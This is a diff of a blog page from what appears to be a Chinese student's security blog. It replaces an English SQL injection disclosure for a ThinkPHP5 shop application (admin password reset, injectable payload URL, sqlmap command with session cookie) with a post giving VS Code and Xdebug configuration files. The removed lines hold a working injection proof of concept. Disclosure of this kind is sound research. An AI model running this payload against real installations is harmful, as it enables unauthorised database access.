@@ -2,7 +2,7 @@
 <html>
 	<head>
 		
-<title>SUL1SS_shop_SQLi-这里是一个普通学生的博客</title>
+<title>VSC+PHPdebug填坑日记-这里是一个普通学生的博客</title>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
@@ -12,7 +12,7 @@
 
 
 
-<meta name="keywords" content="Vuln,">
+<meta name="keywords" content="网络安全,">
 <meta name="description" content="">
 
 
@@ -284,12 +284,12 @@
         <ul class="post-header-tag">
             
             
-            <li><a href="/tags/Vuln">Vuln</a></li>
+            <li><a href="/tags/网络安全">网络安全</a></li>
             
             
         </ul>
         
-        <h1>SUL1SS_shop_SQLi</h1>
+        <h1>VSC+PHPdebug填坑日记</h1>
         <div class="post-header-info">
             <div class="post-header-info-author">
                 
@@ -305,7 +305,7 @@
                 <div class="post-header-info-author-categories">
                     
                 </div>
-                <p>2023-03-04 18:50:34</p>
+                <p>2023-03-10 14:19:20</p>
             </div>
         </div>
     </div>
@@ -315,33 +315,55 @@
   <div id="article" class="post-content-info">
     
 
-    <h1 id="SQLi-Vulnerability-in-SUL1SS-shop"><a href="#SQLi-Vulnerability-in-SUL1SS-shop" class="headerlink" title="SQLi Vulnerability in SUL1SS_shop"></a>SQLi Vulnerability in SUL1SS_shop</h1><p><strong>Project:</strong> <a target="_blank" rel="noopener" href="https://github.com/617746883/thinkphp5.0_shop">https://github.com/617746883/thinkphp5.0_shop</a></p>
-<p>A shop application developed by ThinkPHP5</p>
-<p>Download and deploy in the web directory, and import the database file (install.sql)</p>
-<p><strong>Before starting,</strong> if you need to install the system, you may need to modify the database file (install.sql) to allow you to log in.</p>
-<pre><code>&#39;admin&#39;, &#39;f374baf63f70a5c2c4d172a0a6e37897&#39;, &#39;U66yPU04&#39;
+    <h1 id="VSC-PHPdebug填坑日记"><a href="#VSC-PHPdebug填坑日记" class="headerlink" title="VSC+PHPdebug填坑日记"></a>VSC+PHPdebug填坑日记</h1><p>之前因为重装系统，原本搭建的php调试环境没了<br>本来还没什么问题的，但是最近在研究ThinkPHP，需要手动跟流程，那就必须要搞个调试环境<br>在新的虚拟机里配置这东西发现异常痛苦，踩到各种诡异的坑<br>而且由于是新环境，根本不知道问题出在哪里<br>最要命的是根本触发不到断点，改了半天最后放弃，去拷贝别人的配置文件，改改凑合用</p>
+<p>这里备份一下配置文件，以备后用</p>
+<p><strong>launch.json</strong></p>
+<pre><code>&#123;
+    // 使用 IntelliSense 了解相关属性。 
+    // 悬停以查看现有属性的描述。
+    // 欲了解更多信息，请访问: https://go.microsoft.com/fwlink/?linkid=830387
+    &quot;version&quot;: &quot;0.2.0&quot;,
+    &quot;configurations&quot;: [
+        &#123;
+            &quot;name&quot;: &quot;Listen for XDebug&quot;,
+            &quot;type&quot;: &quot;php&quot;,
+            &quot;request&quot;: &quot;launch&quot;,
+            &quot;port&quot;: 9179,
+            &quot;stopOnEntry&quot;:true,
+            &quot;log&quot;: true
+        &#125;,
+        &#123;
+            &quot;name&quot;: &quot;Launch currently open script&quot;,
+            &quot;type&quot;: &quot;php&quot;,
+            &quot;request&quot;: &quot;launch&quot;,
+            &quot;program&quot;: &quot;$&#123;file&#125;&quot;,
+            &quot;cwd&quot;: &quot;$&#123;fileDirname&#125;&quot;,
+            &quot;port&quot;: 9179,
+            &quot;stopOnEntry&quot;: false,
+            &quot;log&quot;:true
+        &#125;
+    ]
+&#125;
 </code></pre>
-<p>modify it to</p>
-<pre><code>&#39;admin&#39;, &#39;a7da35830936caa0258da1c26c42d6ff&#39;, &#39;lVRVVp9g&#39;
+<p><strong>php.ini（尾部）</strong></p>
+<pre><code>[Xdebug]
+zend_extension=C:/phpstudy_pro/Extensions/php/php7.3.4nts/ext/php_xdebug.dll
+xdebug.trace_output_dir=C:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.trace
+xdebug.profiler_output_dir=C:/phpstudy_pro/Extensions/php_log/php7.3.4nts.xdebug.profiler
+xdebug.profiler_append = 0
+xdebug.profiler_enable = 1
+xdebug.profiler_enable_trigger = 0
+xdebug.profiler_output_name = &quot;cache.out.%t-%s&quot;
+xdebug.remote_enable = 1
+xdebug.remote_handler = &quot;dbgp&quot;
+xdebug.remote_host = &quot;127.0.0.1&quot;
+xdebug.remote_autostart = 1
+xdebug.remote_autorestart=1
+xdebug.remote_connect_back=1
+xdebug.remote_port=9179
+zend_extension=php_xdebug.dll
 </code></pre>
-<p>In this way, the password becomes 123456, and you can <strong>start testing the vulnerability.</strong></p>
-<p>(Since this vulnerability exists in the background, it cannot be exploited if you do not know the password.)</p>
-<p>Visit and log in to the background, for example: <a target="_blank" rel="noopener" href="http://192.168.159.133:8080/index.php/admin/login/index.html">http://192.168.159.133:8080/index.php/admin/login/index.html</a></p>
-<p>Username:admin</p>
-<p>Password:123456</p>
-<p>Vulnerable file: <strong>application\merch\controller\Order.php</strong></p>
-<p><img src="/2023/03/04/SUL1SS-shop-SQLi/code1.png" alt="code1"></p>
-<p>The <strong>$keyword</strong> variable is passed in by the GET method. When other variables meet the judgment conditions, it can finally be <strong>spliced into the SQL statement to cause SQL injection.</strong></p>
-<p><img src="/2023/03/04/SUL1SS-shop-SQLi/code2.png" alt="code2"></p>
-<p><img src="/2023/03/04/SUL1SS-shop-SQLi/code3.png" alt="code3"></p>
-<p>The resulting SQL statement is executed, resulting in blind injection.</p>
-<p><strong>Payload:</strong></p>
-<pre><code>http://192.168.159.133:8080/index.php/admin/order/olist_all.html?paytype=&amp;searchtime=&amp;time[start]=2023-02-04+15%3A02&amp;time[end]=2023-03-04+15%3A02&amp;searchfield=ordersn&amp;keyword=1%27&amp;export=0
-</code></pre>
-<p><strong>sqlmap payload(Replace the cookie with your own):</strong></p>
-<pre><code>sqlmap -u &quot;http://192.168.159.133:8080/index.php/admin/order/olist_all.html?paytype=&amp;searchtime=&amp;time%5Bstart%5D=2023-02-04+15%3A02&amp;time%5Bend%5D=2023-03-04+15%3A02&amp;searchfield=ordersn&amp;keyword=1*&amp;export=0&quot; --cookie=&quot;thinkphp_show_page_trace=0|0; login%40=60ae28k2vl20sg2gi9reljav61&quot; --current-user
-</code></pre>
-<p><img src="/2023/03/04/SUL1SS-shop-SQLi/payload.png" alt="payload"></p>
+<p><strong>然后在Xdebug的启动选项中选择Launch currently open script</strong><br>启动即可<br>用起来很怪，但是勉强能用</p>
 
   </div>
   <div id=""></div>
@@ -402,19 +424,12 @@ Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
 
     <div class="post-paging">
     
-    <a href="/2023/03/10/VSC-PHPdebug%E5%A1%AB%E5%9D%91%E6%97%A5%E8%AE%B0/">
-        <div class="post-paging-last">
-            <span>上一篇</span>
-            <p>VSC+PHPdebug填坑日记</p>
-        </div>
-    </a>
-    
 
     
-    <a href="/2023/02/13/sqlmap%E5%9F%BA%E7%A1%80%E5%8F%8D%E5%88%B6/">
+    <a href="/2023/03/04/SUL1SS-shop-SQLi/">
         <div class="post-paging-next">
             <span>下一篇</span>
-            <p>sqlmap基础反制</p>
+            <p>SUL1SS_shop_SQLi</p>
         </div>
     </a>
     
